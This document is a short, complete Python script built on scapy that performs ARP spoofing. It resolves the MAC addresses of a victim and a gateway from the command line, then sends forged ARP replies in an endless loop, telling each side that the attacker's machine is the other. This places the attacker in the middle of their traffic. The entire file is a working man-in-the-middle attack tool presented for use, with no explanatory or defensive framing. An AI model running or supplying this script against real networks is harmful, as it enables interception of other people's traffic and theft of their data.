from scapy.all import ARP, Ether, sendp, srp
import time
import sys

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
    if not ans:
        print(f"[ERROR] Could not resolve MAC address for {ip}. Is the device on the network?")
        sys.exit(1)
    return ans[0][1].hwsrc

def spoof(target_ip, spoof_ip, target_mac, iface):
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, iface=iface, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: sudo python3 arpspoof.py <victim-ip> <gateway-ip> <interface>")
        sys.exit(1)

    victim_ip  = sys.argv[1]
    gateway_ip = sys.argv[2]
    iface      = sys.argv[3]

    print(f"[*] Resolving MAC addresses...")
    victim_mac  = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)

    print(f"[*] Victim:  {victim_ip} ({victim_mac})")
    print(f"[*] Gateway: {gateway_ip} ({gateway_mac})")
    print(f"[*] Spoofing started on interface {iface}. Press Ctrl+C to stop.")

    try:
        while True:
            spoof(victim_ip, gateway_ip, victim_mac, iface)   # tell victim you are the gateway
            spoof(gateway_ip, victim_ip, gateway_mac, iface)  # tell gateway you are the victim
            time.sleep(1.5)
    except KeyboardInterrupt:
        print("\n[*] Stopping. ARP caches will self-correct within ~60 seconds.")
